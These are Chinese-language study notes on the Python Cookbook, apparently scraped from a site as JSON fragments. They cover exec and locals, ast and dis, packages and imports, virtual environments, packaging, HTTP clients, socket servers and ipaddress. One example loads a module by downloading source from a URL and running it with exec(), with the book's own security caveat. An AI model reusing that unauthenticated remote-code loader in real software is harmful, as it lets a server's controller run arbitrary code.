locals() ... print('before:', loc) ... exec('x += 1') ... print('after:', loc) ... print('x =', x) ... >>> test2() before: {'x': 0} after: {'loc': {...}, 'x': 1} x = 0 >>> 仔细观察最后一步的输出，除非你将 loc 中被修改后的值手动赋值给 x，否则 x 变量值是不会变的。 在使用 locals() 的时候，你需要注意操作顺序。每次它被调用的时候，locals() 会获取局部变量值中的值并覆盖字典中相应的变量。 作为 locals() 的一个替代方案，你可以使用你自己的字典，并将它传递给 exec() 。例如: >>> def test4(): ... a = 13 ... loc = { 'a' : a } ... glb = { } ... exec('b = a + 1', glb, loc) ... b = loc['b'] ... print(b) ... >>> test4() 14 >>> 解析与分析 Python 源码 问题 你想写解析并分析 Python 源代码的程序 解决方案 大部分程序员知道 Python 能够计算或执行字符串形式的源代码: >>> x = 42 >>> eval('2 + 3*4 + x') 56 >>> exec('for i in range(10): print(i)') # 0123456789 >>> ast 模块能被用来将 Python 源码编译成一个可被分析的抽象语法树 （AST）。 例如: >>> import ast >>> ex = ast.parse('2 + 3*4 + x', mode='eval') >>> ex <_ast.Expression object at 0x1007473d0> >>> ast.dump(ex) \"Expression(body=BinOp(left=BinOp(left=Num(n=2), op=Add(), right=BinOp(left=Num(n=3), op=Mult(), right=Num(n=4))), op=Add(), right=Name(id='x', ctx=Load())))\" >>> top = ast.parse('for i in range(10): print(i)', mode='exec') >>> top <_ast.Module object at 0x100747390> >>> ast.dump(top) \"Module(body=[For(target=Name(id='i', ctx=Store()), iter=Call(func=Name(id='range', ctx=Load()), args=[Num(n=10)], keywords=[], starargs=None, kwargs=None), body=[Expr(value=Call(func=Name(id='print', ctx=Load()), args=[Name(id='i', ctx=Load())], keywords=[], starargs=None, kwargs=None))], orelse=[])])\" >>> 分析源码树需要你自己更多的学习，它是由一系列 AST 节点组成的。分析这些节点 最简单的方法就是定义一个访问者类，实现很多 visit_NodeName() 方法，NodeName() 匹配那些你感兴趣的节点。 例如, 自定义记录了哪些名字被加载、存储和删除的信息类: import ast class CodeAnalyzer(ast.NodeVisitor): def __init__(self): self.loaded = set() self.stored = set() self.deleted = set() def visit_Name(self, node): if isinstance(node.ctx, ast.Load): self.loaded.add(node.id) elif isinstance(node.ctx, ast.Store): self.stored.add(node.id) elif isinstance(node.ctx, ast.Del): self.deleted.add(node.id) # Sample usage if __name__ == '__main__': # Some Python code code = ''' for i in range(10): print(i) del i ''' # Parse into an AST top = ast.parse(code, mode='exec') # Feed the AST to analyze name usage c = CodeAnalyzer() c.visit(top) 最后，AST 可以通过 compile() 函数来编译并执行。例如: >>> exec(compile(top,'<stdin>', 'exec')) 拆解 Python 字节码 问题 你想通过将你的代码反编译成低级的字节码来查看它底层的工作机制。 解决方案 dis 模块可以被用来输出任何 Python 函数的反编译结果。例如: >>> def countdown(n): ... while n > 0: ... print('T-minus', n) ... n -= 1 ... print('Blastoff!') ... >>> import dis >>> dis.dis(countdown) ... >>> 讨论 当你想要知道你的程序底层的运行机制的时候，dis 模块是很有用的。比如如果你 想试着理解性能特征。被 dis() 函数解析的原始字节码如下所示: >>> countdown.__code__.co_code b\"x'\\x00|\\x00\\x00d\\x01\\x00k\\x04\\x00r)\\x00t\\x00\\x00d\\x02\\x00|\\x00\\x00\\x83 \\x02\\x00\\x01|\\x00\\x00d\\x03\\x008}\\x00\\x00q\\x03\\x00Wt\\x00\\x00d\\x04\\x00\\x83 \\x01\\x00\\x01d\\x00\\x00S\" >>> 如果你想自己解释这段代码，你需要使用一些在 opcode 模块中定义的常量。例如: >>> c = countdown.__code__.co_code >>> import opcode >>> opcode.opname[c[0]] >>> opcode.opname[c[0]] 'SETUP_LOOP' >>> opcode.opname[c[3]] 'LOAD_FAST' >>>","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-cookbook-Metad-programming.html","loc":"/yq-doc-source-docs-rear-end-python-cookbook-Metad-programming.html"},{"title":"模块与包","text":"模块与包是任何大型程序的核心，就连 Python 安装程序本身也是一个包。本章重 点涉及有关模块和包的常用编程技术，例如如何组织包、把大型模块分割成多个文件、 创建命名空间包。同时，也给出了让你自定义导入语句的秘籍。 构建一个模块的层级包 问题 你想将你的代码组织成由很多分层模块构成的包 解决方案 封装成包是很简单的。在文件系统上组织你的代码，并确保每个目录都定义了一个 __init__.py 文件。例如: graphics/ __init__.py primitive/ __init__.py line.py fill.py text.py formats/ __init__.py png.py jpg.py 一旦你做到了这一点，你应该能够执行各种 import 语句，如下: import graphics.primitive.line from graphics.primitive import line import graphics.formats.jpg as jpg 绝大部分时候让 __init__.py 空着就好。但是有些情况下可能包含代码, 如子模块加载: # graphics/formats/__init__.py from . import jpg from . import png 敏锐的程序员会发现，即使没有 __init__.py 文件存在，python 仍然会导入包。 如果你没有定义 __init__.py 时，实际上创建了一个所谓的\"命名空间包\". 控制模块被全部导入的内容 问题 当使用 from module import * 语句时，希望对从模块或包导出的符号进行精确 控制。 解决方案 在你的模块中定义一个变量 __all__ 来明确地列出需要导出的内容。 举例: # somemodule.py def spam(): pass def grok(): pass blah = 42 # Only export 'spam' and 'grok' __all__ = ['spam', 'grok'] 讨论 尽管强烈反对使用 from module import * , 但是在定义了大量变量名的模块中 频繁使用。如果你不做任何事, 这样的导入将会导入所有不以下划线开头的。另一方面, 如果定义了__all__, 那么只有被列举出的东西会被导出。 如果你将 __all__ 定义成一个空列表, 没有东西将被导入。如果 __all__ 包含未 定义的名字, 在导入时引起 AttributeError。 使用相对路径名导入包中子模块 问题 将代码组织成包, 想用 import 语句从另一个包名没有硬编码过的包的中导入子模 块。 相对导入只适用于在合适的包中的模块。尤其是在顶层的脚本的简单模块 中，它们将不起作用。如果包的部分被作为脚本直接执行，那它们将不起作用 另一方面，如果你使用 Python 的-m 选项来执行先前的脚本，相对导入将会正确 运行。 将模块分割成多个文件 问题 你想将一个模块分割成多个文件。但是你不想将分离的文件统一成一个逻辑模块 时使已有的代码遭到破坏。 举例, 原有代码: # mymodule.py class A: def spam(self): print('A.spam') class B(A): def bar(self): print('B.bar') 假设你想 mymodule.py 分为两个文件，每个定义的一个类, 首先 用 mymodule 目录来替换文件 mymodule.py。这这个目录下，创建以下文件: mymodule/ __init__.py a.py b.py 在 a.py 文件中插入以下代码: # a.py class A: def spam(self): print('A.spam') 在 b.py 文件中插入以下代码: # b.py from .a import A class B(A): def bar(self): print('B.bar') 最后，在 __init__.py 中，将 2 个文件粘合在一起: # __init__.py from .a import A from .b import B 如果按照这些步骤，所产生的包 MyModule 将作为一个单一的逻辑模块: >>> import mymodule >>> a = mymodule.A() >>> a.spam() A.spam >>> b = mymodule.B() >>> b.bar() B.bar >>> 讨论 在这个章节中的主要问题是一个设计问题，不管你是否希望用户使用很多小模块 或只是一个模块。举个例子，在一个大型的代码库中，你可以将这一切都分割成独立的 文件，让用户使用大量的 import 语句，就像这样: from mymodule.a import A from mymodule.b import B ... 这样能工作，但这让用户承受更多的负担，用户要知道不同的部分位于何处。通常 情况下，将这些统一起来，使用一条 import 将更加容易，就像这样: from mymodule import A, B 对后者而言，让 mymodule 成为一个大的源文件是最常见的。 当一个模块被分割，你需要特别注意交叉引用的文件名. 整个章节都使用包的相对导入来避免将顶层模块名硬编码到源代码中. 延迟导入。如图所示，__init__.py 文件一次导入所 有必需的组件的。但是对于一个很大的模块，可能你只想组件在需要时被加载。要做到 这一点，__init__.py 有细微的变化: # __init__.py def A(): from .a import A return A() def B(): from .b import B return B() 延迟加载的主要缺点是继承和类型检查可能会中断 利用命名空间导入目录分散的代码 问题 你可能有大量的代码，由不同的人来分散地维护。每个部分被组织为文件目录，如 一个包。然而，你希望能用共同的包前缀将所有组件连接起来，不是将每一个部分作为 独立的包来安装。 解决方案 从本质上讲，你要定义一个顶级 Python 包，作为一个大集合分开维护子包的命名 空间。这个问题经常出现在大的应用框架中，框架开发者希望鼓励用户发布插件或附加 包。 在统一不同的目录里统一相同的命名空间，但是要删去用来将组件联合起来的 __init__.py 文件。假设你有 Python 代码的两个不同的目录如下: foo-package/ spam/ blah.py bar-package/ spam/ grok.py 让我们看看，如果将 foo-package 和 bar-package 都加到 python 模块路径并尝试导 入会发生什么: >>> import sys >>> sys.path.extend(['foo-package', 'bar-package']) >>> import spam.blah >>> import spam.grok >>> 两个不同的包目录被合并到一起，你可以导入 spam.blah 和 spam.grok，并且它们 能够工作。 讨论 在这里工作的机制被称为\"包命名空间\"的一个特征。从本质上讲，包命名空间是 一种特殊的封装设计，为合并不同的目录的代码到一个共同的命名空间。对于大的框 架，这可能是有用的，因为它允许一个框架的部分被单独地安装下载。它也使人们能够 轻松地为这样的框架编写第三方附加组件和其他扩展。 包命名空间的关键是确保顶级目录中没有 __init__.py 文件来作为共同的命名空 间。缺失 __init__.py 文件使得在导入包的时候会发生有趣的事情：这并没有产生错 误，解释器创建了一个由所有包含匹配包名的目录组成的列表。特殊的包命名空间模块 被创建，只读的目录列表副本被存储在其 __path__ 变量中。举个例子: >>> import spam >>> spam.__path__ _NamespacePath(['foo-package/spam', 'bar-package/spam']) >>> 在定位包的子组件时，目录 __path__ 将被用到 (例如, 当导入 spam.grok 或者 spam.blah 的时候) 包命名空间的一个重要特点是任何人都可以用自己的代码来扩展命名空间。 举个 例子，假设你自己的代码目录像这样: my-package/ spam/ custom.py 如果你将你的代码目录和其他包一起添加到 sys.path，这将无缝地合并到别的 spam 包目录中: >>> import spam.custom >>> import spam.grok >>> import spam.blah >>> 一个包是否被作为一个包命名空间的主要方法是检查其 __file__ 属性。如果没 有，那包是个命名空间。这也可以由其字符表现形式中的\"namespace\"这个词体现出 来: >>> spam.__file__ Traceback (most recent call last): File \"<stdin>\", line 1, in <module> AttributeError: 'module' object has no attribute '__file__' >>> spam <module 'spam' (namespace)> >>> 重新加载模块 问题 你想重新加载已经加载的模块，因为你对其源码进行了修改。 解决方案 使用 imp.reload() 来重新加载先前加载的模块。举个例子: >>> import spam >>> import imp >>> imp.reload(spam) <module 'spam' from './spam.py'> >>> 讨论 重新加载模块在开发和调试过程中常常很有用。但在生产环境中的代码使用会不 安全，因为它并不总是像您期望的那样工作。 reload() 擦除了模块底层字典的内容，并通过重新执行模块的源代码来刷新它。模 块对象本身的身份保持不变。因此，该操作在程序中所有已经被导入了的地方更新了模 块。 注解 像 from module import name 这样导入的不会更新 因此，在生产环境中可能需要避免重新加载模块 运行目录或压缩文件 问题 您有一个已成长为包含多个文件的应用，它已远不再是一个简单的脚本，你想向用 户提供一些简单的方法运行这个程序。 解决方案 如果你的应用程序已经有多个文件，你可以把你的应用程序放进它自己的目录并 添加一个 __main__.py 文件。举个例子，你可以像这样创建目录: myapplication/ spam.py bar.py grok.py __main__.py 如果 __main__.py 存在，你可以简单地在顶级目录运行 Python 解释器: bash % python3 myapplication 解释器将执行 __main__.py 文件作为主程序。 如果你将你的代码打包成 zip 文件，这种技术同样也适用，举个例子: bash % ls spam.py bar.py grok.py __main__.py bash % zip -r myapp.zip *.py bash % python3 myapp.zip ... output from __main__.py ... 讨论 创建一个目录或 zip 文件并添加 __main__.py 文件来将一个更大的 Python 应用 打包是可行的。这和作为标准库被安装到 Python 库的代码包是有一点区别的。相反， 这只是让别人执行的代码包。 由于目录和 zip 文件与正常文件有一点不同，你可能还需要增加一个 shell 脚本， 使执行更加容易。例如，如果代码文件名为 myapp.zip，你可以创建这样一个顶级脚本: #!/usr/bin/env python3 /usr/local/bin/myapp.zip 读取位于包中的数据文件 问题 你的包中包含代码需要去读取的数据文件。你需要尽可能地用最便捷的方式来做 这件事。 解决方案 假设你的包中的文件组织成如下: mypackage/ __init__.py somedata.dat spam.py 现在假设 spam.py 文件需要读取 somedata.dat 文件中的内容。你可以用以下代码 来完成: # spam.py import pkgutil data = pkgutil.get_data(__package__, 'somedata.dat') 由此产生的变量是包含该文件的原始内容的字节字符串。 讨论 要读取数据文件，你可能会倾向于编写使用内置的 I/ O 功能的代码，如 open()。 但是这种方法也有一些问题。 首先，一个包对解释器的当前工作目录几乎没有控制权。因此，编程时任何 I/O 操 作都必须使用绝对文件名。由于每个模块包含有完整路径的 __file__ 变量，这弄清楚 它的路径不是不可能，但它很凌乱。 第二，包通常安装作为.zip 或.egg 文件，这些文件并不像在文件系统上的一个普通 目录里那样被保存。因此，你试图用 open() 对一个包含数据文件的归档文件进行操作， 它根本不会工作。 pkgutil.get_data() 函数是一个读取数据文件的高级工具，不用管包是如何安装以 及安装在哪。它只是工作并将文件内容以字节字符串返回给你 get_data() 的第一个参数是包含包名的字符串。你可以直接使用包名，也可以使 用特殊的变量，比如 __package__。第二个参数是包内文件的相对名称。如果有必要， 可以使用标准的 Unix 命名规范到不同的目录，只有最后的目录仍然位于包中。 将文件夹加入到 sys.path 问题 你无法导入你的 Python 代码因为它所在的目录不在 sys.path 里。你想将添加新目 录到 Python 路径，但是不想硬链接到你的代码。 解决方案 有两种常用的方式将新目录添加到 sys.path。第一种，你可以使用 PYTHONPATH 环境变量来添加。例如: bash % env PYTHONPATH=/some/dir:/other/dir python3 Python 3.3.0 (default, Oct 4 2012, 10:17:33) [GCC 4.2.1 (Apple Inc. build 5666) (dot 3)] on darwin Type \"help\", \"copyright\", \"credits\" or \"license\" for more information. >>> import sys >>> sys.path ['', '/some/dir', '/other/dir', ...] >>> 在自定义应用程序中，这样的环境变量可在程序启动时设置或通过 shell 脚本。 第二种方法是创建一个.pth 文件，将目录列举出来，像这样: # myapplication.pth /some/dir /other/dir 这个.pth 文件需要放在某个 Python 的 site-packages 目录，通常位于/usr/local/ lib/python3.3/site-packages 或者 ~/.local/lib/python3.3/sitepackages。当解释器启动时， .pth 文件里列举出来的存在于文件系统的目录将被添加到 sys.path。安装一个.pth 文件 可能需要管理员权限，如果它被添加到系统级的 Python 解释器。 讨论 比起费力地找文件，你可能会倾向于写一个代码手动调节 sys.path 的值。例如: import sys sys.path.insert(0, '/some/dir') sys.path.insert(0, '/other/dir') 虽然这能\"工作\"，它是在实践中极为脆弱，应尽量避免使用。这种方法的问题是， 它将目录名硬编码到了你的源代码。如果你的代码被移到一个新的位置，这会导致维 护问题。 更好的做法是在不修改源代码的情况下，将 path 配置到其他地方。如果您使 用模块级的变量来精心构造一个适当的绝对路径，有时你可以解决硬编码目录的问题， 比如 __file__。举个例子: import sys from os.path import abspath, join, dirname sys.path.insert(0, join(abspath(dirname(__file__)), 'src')) 这将 src 目录添加到 path 里，和执行插入步骤的代码在同一个目录里。 site-packages 目录是第三方包和模块安装的目录。如果你手动安装你的代码，它将 被安装到 site-packages 目录。虽然用于配置 path 的.pth 文件必须放置在 site-packages 里，但它配置的路径可以是系统上任何你希望的目录。因此，你可以把你的代码放在一 系列不同的目录，只要那些目录包含在.pth 文件里。 通过字符串名导入模块 问题 你想导入一个模块，但是模块的名字在字符串里。你想对字符串调用导入命令。 解决方案 使用 importlib.import_module() 函数来手动导入名字为字符串给出的一个模块或 者包的一部分。举个例子: >>> import importlib >>> math = importlib.import_module('math') >>> math.sin(2) 0.9092974268256817 >>> mod = importlib.import_module('urllib.request') >>> u = mod.urlopen('http://www.python.org') >>> import_module 只是简单地执行和 import 相同的步骤，但是返回生成的模块对象。 你只需要将其存储在一个变量，然后像正常的模块一样使用。 如果你正在使用的包，import_module() 也可用于相对导入。但是，你需要给它一 个额外的参数。例如: import importlib # Same as 'from . import b' b = importlib.import_module('.b', __package__) 讨论 使用 import_module() 手动导入模块的问题通常出现在以某种方式编写修改或覆 盖模块的代码时候。例如，也许你正在执行某种自定义导入机制，需要通过名称来加载 一个模块，通过补丁加载代码。 在旧的代码，有时你会看到用于导入的内建函数 __import__()。尽管它能工作， 但是 importlib.import_module() 通常更容易使用。 通过钩子远程加载模块 问题 你想自定义 Python 的 import 语句，使得它能从远程机器上面透明的加载模块。 解决方案 首先要提出来的是安全问题。本节讨论的思想如果没有一些额外的安全和认知机 制的话会很糟糕。也就是说，我们的主要目的是深入分析 Python 的 import 语句机制。 如果你理解了本节内部原理，你就能够为其他任何目的而自定义 import。有了这些，让 我们继续向前走。 本节核心是设计导入语句的扩展功能。有很多种方法可以做这个，不过为了演示的 方便，我们开始先构造下面这个 Python 代码结构: testcode/ spam.py fib.py grok/ __init__.py blah.py 这里的目的是允许这些文件作为模块被远程访问。也许最简单的方式就是将它们 发布到一个 web 服务器上面。在 testcode 目录中像下面这样运行 Python: bash % cd testcode bash % python3 -m http.server 15000 Serving HTTP on 0.0.0.0 port 15000 ... 服务器运行起来后再启动一个单独的 Python 解释器。确保你可以使用 urllib 访 问到远程文件。例如: >>> from urllib.request import urlopen >>> u = urlopen('http://localhost:15000/fib.py') >>> data = u.read().decode('utf-8') >>> print(data) # fib.py print(\"I'm fib\") def fib(n): if n < 2: return 1 else: return fib(n-1) + fib(n-2) >>> 从这个服务器加载源代码是接下来本节的基础。为了替代手动的通过 urlopen() 来收集源文件，我们通过自定义 import 语句来在后台自动帮我们做到 加载远程模块的第一种方法是创建一个显示的加载函数来完成它: import imp import urllib.request import sys def load_module(url): u = urllib.request.urlopen(url) source = u.read().decode('utf-8') mod = sys.modules.setdefault(url, imp.new_module(url)) code = compile(source, url, 'exec') mod.__file__ = url mod.__package__ = '' exec(code, mod.__dict__) return mod 这个函数会下载源代码，并使用 compile() 将其编译到一个代码对象中，然后在 一个新创建的模块对象的字典中来执行它。下面是使用这个函数的方式: >>> fib = load_module('http://localhost:15000/fib.py') I'm fib 对于简单的模块这个是行得通的。不过它并没有嵌入到通常的 import 语句中，如果要支持更高级的结构比如包就需要更多的工作了。 一个更酷的做法是创建一个自定义导入器。第一种方法是创建一个元路径导入器。 麻烦, 无比麻烦, 跳过 导入模块的同时修改模块 问题 你想给某个已存在模块中的函数添加装饰器。不过，前提是这个模块已经被导入并 且被使用过。 解决方案 这里问题的本质就是你想在模块被加载时执行某个动作。可能是你想在一个模块 被加载时触发某个回调函数来通知你。 安装私有的包 问题 你想要安装一个第三方包，但是没有权限将它安装到系统 Python 库中去。或者， 你可能想要安装一个供自己使用的包，而不是系统上面所有用户。 解决方案 Python 有一个用户安装目录，通常类似\"~/.local/lib/python3.3/site-packages\"。 要强制在这个目录中安装包，可使用安装选项\"–user\"。例如: python3 setup.py install --user # 或者 pip install --user packagename 在 sys.path 中用户的\"site-packages\"目录位于系统的\"site-packages\"目录之前。 因此，你安装在里面的包就比系统已安装的包优先级高（尽管并不总是这样，要取决于 第三方包管理器，比如 distribute 或 pip）。 创建新的 Python 环境 问题 你想创建一个新的 Python 环境，用来安装模块和包。不过，你不想安装一个新的 Python 克隆，也不想对系统 Python 环境产生影响。 解决方案 你可以使用 pyvenv 命令创建一个新的\"虚拟\"环境。这个命令被安装在 Python 解释器同一目录，或 Windows 上面的 Scripts 目录中。 书上是旧版本的, 新版本这样用: python -m venv venv_3910 最后一个参数就是新环境的名称, 是要被创建的目录名, 注意写好后不能移动位置. 讨论 创建虚拟环境通常是为了安装和管理第三方包。正如你在例子中看到的那样，sys. path 变量包含来自于系统 Python 的目录，而 site-packages 目录已经被重定位到一个 新的目录。 有了一个新的虚拟环境，下一步就是安装一个包管理器，比如 distribute 或 pip。 但安装这样的工具和包的时候，你需要确保你使用的是虚拟环境的解释器。它会将包安 装到新创建的 site-packages 目录中去。 尽管一个虚拟环境看上去是 Python 安装的一个复制，不过它实际上只包含了少量 几个文件和一些符号链接。所有标准库函文件和可执行解释器都来自原来的 Python 安 装。因此，创建这样的环境是很容易的，并且几乎不会消耗机器资源。 默认情况下，虚拟环境是空的，不包含任何额外的第三方库。如果你想将一个已经 安装的包作为虚拟环境的一部分，可以使用\"–system-site-packages\"选项来创建虚拟 环境 分发包 问题 你已经编写了一个有用的库，想将它分享给其他人 解决方案 如果你想分发你的代码，第一件事就是给它一个唯一的名字，并且清理它的目录结 构。例如，一个典型的函数库包会类似下面这样: projectname/ README.txt Doc/ documentation.txt projectname/ __init__.py foo.py bar.py utils/ __init__.py spam.py grok.py examples/ helloworld.py ... 要让你的包可以发布出去，首先你要编写一个 setup.py ，类似下面这样: # setup.py from distutils.core import setup setup(name='projectname', version='1.0', author='Your Name', author_email='you@youraddress.com', url='http://www.you.com/projectname', packages=['projectname', 'projectname.utils'], ) 下一步，就是创建一个 MANIFEST.in 文件，列出所有在你的包中需要包含进来的 非源码文件: # MANIFEST.in include *.txt recursive-include examples * recursive-include Doc * 确保 setup.py 和 MANIFEST.in 文件放在你的包的最顶级目录中。一旦你已经做 了这些，你就可以像下面这样执行命令来创建一个源码分发包了: % bash python3 setup.py sdist 它会创建一个文件比如\"projectname-1.0.zip\"或\"projectname-1.0.tar.gz\", 具体 依赖于你的系统平台。如果一切正常，这个文件就可以发送给别人使用或者上传至 Python Package Index. 讨论 对于纯 Python 代码，编写一个普通的 setup.py 文件通常很简单。一个可能的问 题是你必须手动列出所有构成包源码的子目录。一个常见错误就是仅仅只列出一个包 的最顶级目录，忘记了包含包的子组件。这也是为什么在 setup.py 中对于包的说明包 含了列表 packages=['projectname', 'projectname.utils'] 有很多第三方包管理器供选择，包括 setuptools、 distribute 等等。有些是为了替代标准库中的 distutils。注意如果你依赖这些包，用户可 能不能安装你的软件，除非他们已经事先安装过所需要的包管理器。正因如此，你更应 该时刻记住越简单越好的道理。最好让你的代码使用标准的 Python 3 安装。如果其他 包也需要的话，可以通过一个可选项来支持。 对于涉及到 C 扩展的代码打包与分发就更复杂点了。","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-cookbook-Module-and-package.html","loc":"/yq-doc-source-docs-rear-end-python-cookbook-Module-and-package.html"},{"title":"网络与 Web 编程","text":"本章是关于在网络应用和分布式应用中使用的各种主题。主题划分为使用 Python 编写客户端程序来访问已有的服务，以及使用 Python 实现网络服务端程序。也给出了 一些常见的技术，用于编写涉及协同或通信的的代码。 作为客户端与 HTTP 服务交互 问题 你需要通过 HTTP 协议以客户端的方式访问多种服务。例如，下载数据或者与基 于 REST 的 API 进行交互。 解决方案 对于简单的事情来说，通常使用 urllib.request 模块就够了。例如，发送一个简 单的 HTTP GET 请求到远程的服务上，可以这样做: from urllib import request, parse # Base URL being accessed url = 'http://httpbin.org/get' # Dictionary of query parameters (if any) parms = { 'name1' : 'value1', 'name2' : 'value2' } # Encode the query string querystring = parse.urlencode(parms) # Make a GET request and read the response u = request.urlopen(url+'?' + querystring) resp = u.read() 如果你需要使用 POST 方法在请求主体中发送查询参数，可以将参数编码后作为 可选参数提供给 urlopen() 函数，就像这样: # Make a POST request and read the response u = request.urlopen(url, querystring.encode('ascii')) resp = u.read() 如果你需要在发出的请求中提供一些自定义的 HTTP 头，例如修改 user-agent 字 段, 可以创建一个包含字段值的字典，并创建一个 Request 实例然后将其传给 urlopen() ，如下: from urllib import request, parse ... # Extra headers headers = { 'User-agent' : 'none/ofyourbusiness', 'Spam' : 'Eggs' } req = request.Request(url, querystring.encode('ascii'), headers=headers) # Make a request and read the response u = request.urlopen(req) resp = u.read() 如果需要交互的服务比上面的例子都要复杂，也许应该去看看 requests 库: resp = requests.post(url, data=parms, headers=headers) 关于 requests 库，一个值得一提的特性就是它能以多种方式从请求中返回响应结 果的内容。 resp.text 带给我们的是以 Unicode 解码的响应文本 resp.content ，就会得到原始的二进制数据 resp.json ，那么就会得到 JSON 格式的响应内容 利用 requests 通过基本认证登录 Pypi import requests resp = requests.get('http://pypi.python.org/pypi?:action=login', auth=('user','password')) 利用 requests 将 HTTP cookies 从一个请求传递到另一个的例子: import requests # First request resp1 = requests.get(url) ... # Second requests with cookies received on first requests resp2 = requests.get(url, cookies=resp1.cookies) 最后但并非最不重要的一个例子是用 requests 上传内容: import requests url = 'http://httpbin.org/post' files = { 'file': ('data.csv', open('data.csv', 'rb')) } r = requests.post(url, files=files) 讨论 对于真的很简单 HTTP 客户端代码，用内置的 urllib 模块通常就足够了。但是， 如果你要做的不仅仅只是简单的 GET 或 POST 请求，那就真的不能再依赖它的功能 了。这时候就是第三方模块比如 requests 大显身手的时候了。 request 库还对许多高级的 HTTP 客户端协议提供了支持， 比如 OAuth。requests 模块的文档（ http://docs.python-requests.org ) 质量很高 创建 TCP 服务器 问题 你想实现一个服务器，通过 TCP 协议和客户端通信。 解决方案 创建一个 TCP 服务器的一个简单方法是使用 socketserver 库。例如，下面是一 个简单的应答服务器: from socketserver import BaseRequestHandler, TCPServer class EchoHandler(BaseRequestHandler): def handle(self): print('Got connection from', self.client_address) while True: msg = self.request.recv(8192) if not msg: break self.request.send(msg) if __name__ == '__main__': serv = TCPServer(('', 20000), EchoHandler) serv.serve_forever() 使用另一个客户端测试: >>> from socket import socket, AF_INET, SOCK_STREAM >>> s = socket(AF_INET, SOCK_STREAM) >>> s.connect(('localhost', 20000)) >>> s.send(b'Hello') 5 >>> s.recv(8192) b'Hello' >>> 很 多 时 候， 可 以 很 容 易 的 定 义 一 个 不 同 的 处 理 器。 下 面 是 一 个 使 用 StreamRequestHandler 基类将一个类文件接口放置在底层 socket 上的例子: from socketserver import StreamRequestHandler, TCPServer class EchoHandler(StreamRequestHandler): def handle(self): print('Got connection from', self.client_address) # self.rfile is a file-like object for reading for line in self.rfile: # self.wfile is a file-like object for writing self.wfile.write(line) if __name__ == '__main__': serv = TCPServer(('', 20000), EchoHandler) serv.serve_forever() 讨论 socketserver 可以让我们很容易的创建简单的 TCP 服务器。但是，你需要注意 的是，默认情况下这种服务器是单线程的，一次只能为一个客户端连接服务。如果你想 处理多个客户端，可以初始化一个 ForkingTCPServer 或者是 ThreadingTCPServer 对 象。例如: from socketserver import ThreadingTCPServer if __name__ == '__main__': serv = ThreadingTCPServer(('', 20000), EchoHandler) serv.serve_forever() 使用 fork 或线程服务器有个潜在问题就是它们会为每个客户端连接创建一个新的 进程或线程。由于客户端连接数是没有限制的，因此一个恶意的黑客可以同时发送大量 的连接让你的服务器奔溃。 如果你担心这个问题，你可以创建一个预先分配大小的工作线程池或进程池。你先 创建一个普通的非线程服务器，然后在一个线程池中使用 serve_forever() 方法来启 动它们: from threading import Thread NWORKERS = 16 serv = TCPServer(('', 20000), EchoHandler) for n in range(NWORKERS): t = Thread(target=serv.serve_forever) t.daemon = True t.start() serv.serve_forever() 一般来讲，一个 TCPServer 在实例化的时候会绑定并激活相应的 socket 。不过，有时候你想通过设置某些选项去调整底下的 socket‘ ，可以设置参数 bind_and_activate=False 。如下: serv = TCPServer(('', 20000), EchoHandler, bind_and_activate=False) # Set up various socket options serv.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, True) # Bind and activate serv.server_bind() serv.server_activate() serv.serve_forever() 上面的 socket 选项是一个非常普遍的配置项，它允许服务器重新绑定一个之前使 用过的端口号。由于要被经常使用到，它被放置到类变量中，可以直接在 TCPServer 上 面设置。在实例化服务器的时候去设置它的值，如下所示: TCPServer.allow_reuse_address = True serv = TCPServer(('', 20000), EchoHandler) serv.serve_forever() 在上面示例中，我们演示了两种不同的处理器基类（BaseRequestHandler 和 StreamRequestHandler ）。StreamRequestHandler 更加灵活点，能通过设置其他的类 变量来支持一些新的特性。 最后，还需要注意的是巨大部分 Python 的高层网络模块（比如 HTTP、XML-RPC 等）都是建立在 socketserver 功能之上。也就是说，直接使用 socket 库来实现服务 器也并不是很难。 创建 UDP 服务器 问题 你想实现一个基于 UDP 协议的服务器来与客户端通信。 解决方案 跟 TCP 一样，UDP 服务器也可以通过使用 socketserver 库很容易的被创建。例 如，下面是一个简单的时间服务器: from socketserver import BaseRequestHandler, UDPServer import time class TimeHandler(BaseRequestHandler): def handle(self): print('Got connection from', self.client_address) # Get message and client socket msg, sock = self.request resp = time.ctime() sock.sendto(resp.encode('ascii'), self.client_address) if __name__ == '__main__': serv = UDPServer(('', 20000), TimeHandler) serv.serve_forever() 来测试下这个服务器: >>> from socket import socket, AF_INET, SOCK_DGRAM >>> s = socket(AF_INET, SOCK_DGRAM) >>> s.sendto(b'', ('localhost', 20000)) 0 >>> s.recvfrom(8192) (b'Wed Aug 15 20:35:08 2012', ('127.0.0.1', 20000)) >>> 讨论 一个典型的 UDP 服务器接收到达的数据报 (消息) 和客户端地址。如果服务器需 要做应答，它要给客户端回发一个数据报。对于数据报的传送，你应该使用 socket 的 sendto() 和 recvfrom() 方法。尽管传统的 send() 和 recv() 也可以达到同样的效果， 但是前面的两个方法对于 UDP 连接而言更普遍。 由于没有底层的连接，UPD 服务器相对于 TCP 服务器来讲实现起来更加简单。不 过，UDP 天生是不可靠的（因为通信没有建立连接，消息可能丢失）。因此需要由你自 己来决定该怎样处理丢失消息的情况。 通常来 说，如果可靠性对于你程序很重要，你需要借助于序列号、重试、超时以及一些其他方 法来保证。UDP 通常被用在那些对于可靠传输要求不是很高的场合。例如，在实时应 用如多媒体流以及游戏领域，无需返回恢复丢失的数据包（程序只需简单的忽略它并 继续向前运行）。 UDPServer 类是单线程的，也就是说一次只能为一个客户端连接服务。实际使用 中，这个无论是对于 UDP 还是 TCP 都不是什么大问题。如果你想要并发操作，可以 实例化一个 ForkingUDPServer 或 ThreadingUDPServer 对象 通过 CIDR 地址生成对应的 IP 地址集 问题 你有一个 CIDR 网络地址比如\"123.45.67.89/27\"，你想将其转换成它所代表的所 有 IP （比如，\"123.45.67.64\", \"123.45.67.65\", …, \"123.45.67.95\")） 解决方案 可以使用 ipaddress 模块很容易的实现这样的计算。例如: >>> import ipaddress >>> net = ipaddress.ip_network('123.45.67.64/27') >>> net IPv4Network('123.45.67.64/27') >>> for a in net: ... print(a) ... 123.45.67.64 123.45.67.65 123.45.67.66 123.45.67.67 123.45.67.68 ... 123.45.67.95 >>> >>> net6 = ipaddress.ip_network('12:3456:78:90ab:cd:ef01:23:30/125') >>> net6 IPv6Network('12:3456:78:90ab:cd:ef01:23:30/125') >>> for a in net6: ... print(a) ... 12:3456:78:90ab:cd:ef01:23:30 12:3456:78:90ab:cd:ef01:23:31 